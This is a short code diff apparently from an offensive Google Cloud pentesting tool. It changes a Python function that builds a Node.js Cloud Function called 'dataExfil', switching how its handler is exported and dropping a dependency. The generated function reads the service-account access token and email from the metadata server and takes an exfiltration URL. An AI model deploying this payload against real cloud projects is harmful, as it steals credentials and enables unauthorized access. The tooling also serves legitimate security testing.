@@ -552,7 +552,6 @@ def _nodejs_payload(exfil_url: str = "", secret_path: str = "") -> Dict[str, str
 """
     index_js = f"""\
 'use strict';
-const functions = require('@google-cloud/functions-framework');
 const http = require('http');
 const MARKER_EMAIL = 'GCPWN_CF_EMAIL=';
 const MARKER_TOKEN = 'GCPWN_CF_TOKEN=';
@@ -569,7 +568,7 @@ function fetchMeta(path) {{
   }});
 }}
 
-functions.http('dataExfil', async (req, res) => {{
+exports.dataExfil = async (req, res) => {{
 {path_check}\
   try {{
     const [tokenJson, emailRaw] = await Promise.all([fetchMeta('token'), fetchMeta('email')]);
@@ -583,9 +582,9 @@ functions.http('dataExfil', async (req, res) => {{
   }} catch (err) {{
     res.status(500).json({{error: err.message}});
   }}
-}});
+}};
 """
-    package_json = '{"main":"index.js","dependencies":{"@google-cloud/functions-framework":"^3.0.0"}}'
+    package_json = '{"main":"index.js"}'
     return {"index.js": index_js, "package.json": package_json}
 
 
